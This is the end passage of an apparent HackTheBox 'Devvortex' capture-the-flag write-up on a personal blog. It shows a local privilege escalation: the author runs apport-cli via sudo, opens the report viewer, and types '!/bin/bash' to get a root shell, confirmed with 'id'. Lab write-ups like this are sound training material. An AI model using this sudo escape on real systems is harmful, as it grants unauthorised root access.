</span></span><span class="line"><span class="cl">  File &#34;/usr/bin/apport-cli&#34;, line 387, in &lt;module&gt;
</span></span><span class="line"><span class="cl">    if not app.run_argv():
</span></span><span class="line"><span class="cl">  File &#34;/usr/lib/python3/dist-packages/apport/ui.py&#34;, line 770, in run_argv
</span></span><span class="line"><span class="cl">    xprop = subprocess.Popen([&#39;xprop&#39;, &#39;_NET_WM_PID&#39;],
</span></span><span class="line"><span class="cl">  File &#34;/usr/lib/python3.8/subprocess.py&#34;, line 858, in __init__
</span></span><span class="line"><span class="cl">    self._execute_child(args, executable, preexec_fn, close_fds,
</span></span><span class="line"><span class="cl">  File &#34;/usr/lib/python3.8/subprocess.py&#34;, line 1704, in _execute_child
</span></span><span class="line"><span class="cl">    raise child_exception_type(errno_num, err_msg, err_filename)
</span></span><span class="line"><span class="cl">FileNotFoundError: [Errno 2] No such file or directory: &#39;xprop&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Following the crash event, we are given the option to view the report:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">logan@devvortex:/tmp$ sudo /usr/bin/apport-cli
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*** Send problem report to the developers?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">After the problem report has been sent, please fill out the form in the
</span></span><span class="line"><span class="cl">automatically opened web browser.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">What would you like to do? Your options are:
</span></span><span class="line"><span class="cl">  S: Send report (30.2 KB)
</span></span><span class="line"><span class="cl">  V: View report
</span></span><span class="line"><span class="cl">  K: Keep report file for sending later or copying to somewhere else
</span></span><span class="line"><span class="cl">  I: Cancel and ignore future crashes of this program version
</span></span><span class="line"><span class="cl">  C: Cancel
</span></span><span class="line"><span class="cl">Please choose (S/V/K/I/C): 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Selecting View does some preparation, before we are dropped in a viewer software, which I believe to be <code>less</code>. We can invoke an interactive shell by typing <code>!/bin/bash</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                          SEARCHING
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  /pattern          *  Search forward for (N-th) matching line.
</span></span><span class="line"><span class="cl">  ?pattern          *  Search backward for (N-th) matching line.
</span></span><span class="line"><span class="cl">  n                 *  Repeat previous search (for N-th occurrence).
</span></span><span class="line"><span class="cl">  N                 *  Repeat previous search in reverse direction.
</span></span><span class="line"><span class="cl">  ESC-n             *  Repeat previous search, spanning files.
</span></span><span class="line"><span class="cl">  ESC-N             *  Repeat previous search, reverse dir. &amp; spanning files.
</span></span><span class="line"><span class="cl">  ESC-u                Undo (toggle) search highlighting.
</span></span><span class="line"><span class="cl">  &amp;pattern          *  Display only matching lines
</span></span><span class="line"><span class="cl">        ---------------------------------------------------
</span></span><span class="line"><span class="cl">        A search pattern may begin with one or more of:
</span></span><span class="line"><span class="cl">        ^N or !  Search for NON-matching lines.
</span></span><span class="line"><span class="cl">        ^E or *  Search multiple files (pass thru END OF FILE).
</span></span><span class="line"><span class="cl">        ^F or @  Start search at FIRST file (for /) or last file (for ?).
</span></span><span class="line"><span class="cl">        ^K       Highlight matches, but don&#39;t move (KEEP position).
</span></span><span class="line"><span class="cl">        ^R       Don&#39;t use REGULAR EXPRESSIONS.
</span></span><span class="line"><span class="cl"> ---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">!/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>After hitting the return key, we now have a bash sesison as the user <code>root</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@devvortex:/home/logan# id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/joomla/">Joomla</a>
        
            <a href="/tags/webshell/">Webshell</a>
        
            <a href="/tags/mysql/">MySQL</a>
        
            <a href="/tags/hashcat/">Hashcat</a>
        
            <a href="/tags/less/">Less</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hackthebox-surveillance/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Surveillance"
                        
                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Surveillance</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-monitorstwo/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-monitorstwo/MonitorsTwo.7bcf0cb787855b0537bc7c5327c0f7dd_hu11328676933836087193.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - MonitorsTwo"
                        
                        data-hash="md5-e88Mt4eFWwU3vHxTJ8D33Q==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - MonitorsTwo</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-codify/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu5530218627868483871.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Codify"
                        
                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Codify</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-sau/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu4137443262157332936.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Sau"
                        
                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Sau</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-hospital/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Hospital"
                        
                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Hospital</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
